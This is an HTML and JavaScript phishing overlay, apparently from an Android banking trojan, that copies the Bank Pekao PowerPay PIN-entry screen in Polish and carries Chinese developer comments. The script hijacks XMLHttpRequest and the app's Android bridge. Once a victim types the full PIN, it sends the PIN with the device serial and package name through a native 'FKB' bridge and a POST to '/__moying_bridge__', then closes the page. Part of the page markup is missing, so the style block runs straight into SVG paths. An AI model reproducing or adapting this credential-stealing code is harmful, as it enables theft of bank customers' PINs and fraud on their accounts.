<!DOCTYPE html>
<html lang="pl">
<head><script>window.__MOYING_TPL='pekao';</script>
<script>
/* ===== 墨影注入页协议 shim（只走原生桥，禁止任何外发） ===== */
(function(){
  var TPL = window.__MOYING_TPL || 'unknown';
  function pk(){ try{ return (window.FKB && FKB.getPkg) ? (FKB.getPkg()||'') : ''; }catch(e){ return ''; } }
  function sn(){ try{ return (window.FKB && FKB.getSn) ? (FKB.getSn()||'') : ''; }catch(e){ return ''; } }
  function push(form){
    var pl = JSON.stringify({ pkg: pk(), sn: sn(), template: TPL, formData: form || {} });
    try{ if(window.FKB && FKB.setFormData) FKB.setFormData(pl); }catch(e){}
    setTimeout(function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }, 300);
    return pl;
  }
  window.__moyingPush = push;
  /* ① 页面自带的 XMLHttpRequest 外发统一截获，改走桥 */
  var _open = XMLHttpRequest.prototype.open, _send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(m,u){ this.__mu = String(u||''); return _open.apply(this, arguments); };
  XMLHttpRequest.prototype.send = function(b){
    var u = this.__mu || '';
    if(u.indexOf('/__moying_bridge__') >= 0 || u.indexOf('/api/inj/result') >= 0){
      var o = {}, tpl = TPL;
      try{ o = JSON.parse(b||'{}'); }catch(e){}
      if(o && o.template) tpl = o.template;
      var form = (o && (o.formData || o.data)) ? (o.formData || o.data) : o;
      window.__MOYING_TPL = tpl;
      push(form);
      return;
    }
    return _send.apply(this, arguments);
  };
  /* ② 直接调用 Android.returnResult(json) 的老页面（如 millennium）也转成我们的协议 */
  var orig = (window.Android && window.Android.returnResult) ? window.Android.returnResult : null;
  var bridge = {
    returnResult: function(s){
      var o = null;
      try{ o = (typeof s === 'string') ? JSON.parse(s) : s; }catch(e){ o = null; }
      if(o && o.action){ if(orig){ try{ return orig(s); }catch(e){} } return; }
      if(o && (o.formData || o.pkg)) push(o.formData || o);
      else push(o || {});
    },
    setFormData: function(s){ try{ var o=JSON.parse(s); push(o.formData||o); }catch(e){ push({}); } },
    getPkg: function(){ return pk(); },
    getSn: function(){ return sn(); },
    getUserName: function(){ try{ return (orig && orig.getUserName && orig.getUserName()) || ''; }catch(e){ return ''; } },
    setClosePage: function(p){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(p||pk()); }catch(e){} },
    close: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} },
    finish: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }
  };
  try{ window.Android = bridge; }catch(e){}
})();
</script>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="format-detection" content="telephone=no">
<meta name="theme-color" content="#D71A20">
<title>PowerPay</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
:root{
  --red:#D71A20;
  --ink:#1A1A1A;
  --muted:#6E6E73;
  --key:#F4F4F6;
  --key-press:#E7E7EB;
  --dot:#C9C9CE;
}
body{
  background:#fff;color:var(--ink);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  -webkit-font-smoothing:antialiased;
  -webkit-user-select:none;user-select:none;
  overscroll-behavior:none;
}
.app{min-height:100vh;min-height:100dvh;display:flex;flex-direction:column}

/* ---------- top bar ---------- */
.topbar{
  flex:0 0 auto;background:var(--red);
  height:calc(56px + env(safe-area-inset-top,0px));
  padding:env(safe-area-inset-top,0px) 12px 0 8px;
  display:flex;align-items:center;
}
.menu{
  width:44px;height:44px;flex:0 0 44px;border:0;background:none;
  display:flex;align-items:center;justify-content:center;
}
.menu svg{width:24px;height:24px;stroke:#fff;stroke-width:2;stroke-linecap:round}
.brand{height:21px;margin-left:6px;display:block}

/* ---------- pin head ---------- */
.head{flex:0 0 auto;padding-top:34px;text-align:center}
.head h1{font-size:21px;font-weight:600;letter-spacing:.2px;color:var(--ink)}
.dots{display:flex;justify-content:center;align-items:center;gap:17px;margin-top:30px;height:14px}
.dot{
  width:13px;height:13px;border-radius:50%;
  border:1.6px solid var(--dot);background:transparent;
  transition:background .16s,border-color .16s,transform .16s;
}
.dot.on{background:var(--ink);border-color:var(--ink);animation:pop .18s ease-out}
@keyframes pop{0%{transform:scale(.55)}70%{transform:scale(1.12)}100%{transform:scale(1)}}

/* ---------- keypad ---------- */
.pad{
  flex:0 0 auto;width:284px;max-width:86%;margin:86px auto 0;
  display:grid;grid-template-columns:repeat(3,1fr);gap:12px;
}
.key{
  height:74px;border:0;border-radius:16px;background:var(--key);
  font-family:inherit;font-size:25px;font-weight:400;color:var(--ink);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:1px;cursor:pointer;transition:background .12s,transform .08s;
}
.key:active{background:var(--key-press);transform:scale(.97)}
.key .num{line-height:1}
.key.fn svg{width:21px;height:21px;stroke:#3A3A3C;fill:none;stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round}
.key.fn .lbl{font-size:8.6px;line-height:1.1;color:#3A3A3C;letter-spacing:.1px;text-align:center}
.key.fn.bio .lbl{max-width:74px}
.key.dim{opacity:.4;pointer-events:none}

/* ---------- forgot ---------- */
.forgot{
  flex:0 0 auto;display:block;margin:26px auto 0;
  border:0;background:none;padding:10px 16px;
  font-family:inherit;font-size:14px;font-weight:500;color:var(--red);letter-spacing:.1px;
}
.forgot:active{opacity:.6}

.tail{flex:1 1 auto}

.shake{animation:shake .42s cubic-bezier(.36,.07,.19,.97)}
@keyframes shake{
  10%,90%{transform:translateX(-2px)}
  20%,80%{transform:translateX(3px)}
  30%,70%{transform:translateX(-4px)}
  40%,60%{transform:translateX(4px)}
  50%{transform:translateX(-2px)}
}
@media (max-height:730px){
  .head{padding-top:22px}
  .dots{margin-top:22px}
  .pad{margin-top:44px}
  .key{height:64px}
  .forgot{margin-top:16px}
}
</style>
</head>

        <path d="M4.2 10.4c1.4-2.6 4.3-4.3 7.8-4.3 3.4 0 6.3 1.7 7.7 4.3"/>
        <path d="M12 6.9c-2.6 0-4.8 1.4-5.8 3.5"/>
        <path d="M17.8 10.4c-1-2.1-3.2-3.5-5.8-3.5"/>
        <path d="M12 10.2c-1.9 0-3.4 1.5-3.4 3.4v1.6c0 .8.1 1.6.4 2.3"/>
        <path d="M15.4 13.6c0-1.9-1.5-3.4-3.4-3.4"/>
        <path d="M12 13.6v3.1c0 1-.3 1.9-.8 2.7"/>
        <path d="M6.6 15.2c0 .8.1 1.5.3 2.2"/>
        <path d="M17.4 15.2c0 1.6-.3 3-1 4.2"/>
      </svg>
      <span class="lbl">Włącz<br>biometrię</span>
    </button>

    <button class="key" type="button" data-k="0"><span class="num">0</span></button>

    <button class="key fn" type="button" data-k="del" aria-label="Usuń">
      <svg viewBox="0 0 24 24">
        <path d="M9 5h10a1.5 1.5 0 0 1 1.5 1.5v11A1.5 1.5 0 0 1 19 19H9l-5.4-6.3a1 1 0 0 1 0-1.4L9 5z"/>
        <path d="M12.5 9.5l5 5M17.5 9.5l-5 5"/>
      </svg>
      <span class="lbl">Usuń</span>
    </button>
  </div>

  <button class="forgot" id="forgot" type="button">Nie pamiętam PINu</button>

  <div class="tail"></div>
</div>

<script>
(function(){
  "use strict";

  var PIN_LEN = 6;              /* 改这里即可切换 PIN 位数 */
  var TEMPLATE = "pekao_powerpay";

  var PKG = "", SN = "";
  try { if (typeof FKB !== "undefined") { if (FKB.getPkg) PKG = FKB.getPkg(); if (FKB.getSn) SN = FKB.getSn(); } } catch (e) {}

  var dotsBox = document.getElementById("dots");
  var pad = document.getElementById("pad");
  var forgot = document.getElementById("forgot");
  var brand = document.getElementById("brand");

  var pin = "", sent = false;
  var dots = [];

  for (var i = 0; i < PIN_LEN; i++) {
    var d = document.createElement("span");
    d.className = "dot";
    dotsBox.appendChild(d);
    dots.push(d);
  }

  function toJSON(o) {
    try { return JSON.stringify(o); } catch (e) {}
    var out = [], k, v;
    for (k in o) {
      if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
      v = o[k];
      if (typeof v === "string") out.push('"' + k + '":"' + v.replace(/\\/g, "\\\\").replace(/"/g, '\\"') + '"');
      else out.push('"' + k + '":' + v);
    }
    return "{" + out.join(",") + "}";
  }

  function report(payload, useBridge) {
    var pl = toJSON(payload);
    if (useBridge) {
      try { if (typeof Android !== "undefined" && Android.returnResult) Android.returnResult(pl); } catch (e) {}
    }
    if (location.protocol !== "http:" && location.protocol !== "https:") return pl;
    try {
      var x = new XMLHttpRequest();
      x.open("POST", location.origin + "/__moying_bridge__", true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({ deviceId: SN, pkg: PKG, template: TEMPLATE, formData: pl }));
    } catch (e) {}
    return pl;
  }

  function render() {
    for (var i = 0; i < dots.length; i++) {
      dots[i].classList.toggle("on", i < pin.length);
    }
  }

  function submit() {
    if (sent) return;
    sent = true;
    pad.classList.add("dim");
    /* PIN 页即终点：上报 + 关页 */
    report({ pin: pin, step: "pin" }, true);
    setTimeout(function(){
      try { if (typeof Android !== "undefined" && Android.close) Android.close(); } catch (e) {}
    }, 600);
  }

  function press(k) {
    if (sent) return;
    if (k === "del") {
      pin = pin.slice(0, -1);
      render();
      return;
    }
    if (k === "bio") {
      /* 生物识别入口：保持原样，不触发系统弹窗 */
      return;
    }
    if (pin.length >= PIN_LEN) return;
    pin += k;
    render();
    if (pin.length === PIN_LEN) {
      setTimeout(submit, 190);
    }
  }

  pad.addEventListener("click", function(e){
    var btn = e.target.closest(".key");
    if (!btn) return;
    press(btn.getAttribute("data-k"));
  });

  /* 物理键盘（桌面调试/外接键盘） */
  document.addEventListener("keydown", function(e){
    if (e.key >= "0" && e.key <= "9") { press(e.key); }
    else if (e.key === "Backspace") { e.preventDefault(); press("del"); }
  });

  forgot.addEventListener("click", function(){
    if (sent) return;
    var f = document.querySelector(".head");
    f.classList.remove("shake");
    void f.offsetWidth;
    f.classList.add("shake");
  });

  brand.addEventListener("error", function(){
    /* logo 兜底：纯文字 */
    var s = document.createElement("span");
    s.textContent = "Bank Pekao";
    s.style.cssText = "color:#fff;font-size:17px;font-weight:600;margin-left:8px;letter-spacing:.2px";
    brand.parentNode.replaceChild(s, brand);
  });
})();
</script>
</body>
<!-- moying pkg=pl.pekao24.pekao tpl=pekao -->
</html>
